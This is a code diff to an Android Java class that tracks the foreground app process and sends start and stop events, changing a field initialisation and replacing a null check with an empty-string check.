@@ -21,6 +21,7 @@ import com.android.deviceinfo.Standby;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.interfaces.Observer;
 import com.android.deviceinfo.util.Check;
+import com.android.deviceinfo.util.StringUtils;
 
 public class ListenerProcess extends Listener<ProcessInfo> implements Observer<Standby> {
 	/** The Constant TAG. */
@@ -29,8 +30,8 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 	private BroadcastMonitorProcess processReceiver;
 	//TreeMap<String, RunningAppProcessInfo> lastRunning = new TreeMap<String, RunningAppProcessInfo>();
 	//TreeMap<String, RunningAppProcessInfo> currentRunning = new TreeMap<String, RunningAppProcessInfo>();
-	String currentForeground;
-	String lastForeground;
+	//String currentForeground;
+	String lastForeground = "";
 
 	private boolean started;
 
@@ -123,7 +124,7 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 	}
 	
 	public synchronized boolean isRunning(String appName){
-		return currentForeground.equals(appName);
+		return lastForeground.equals(appName);
 	}
 
 	protected synchronized int dispatch(String currentForeground) {
@@ -133,7 +134,7 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 				Check.log(TAG + " (notification): started " + currentForeground);//$NON-NLS-1$
 			}
 			dispatch(new ProcessInfo(currentForeground, ProcessStatus.START));
-			if(lastForeground!=null){
+			if(!StringUtils.isEmpty(lastForeground)){
 				super.dispatch(new ProcessInfo(lastForeground, ProcessStatus.STOP));
 			}
 			lastForeground = currentForeground;
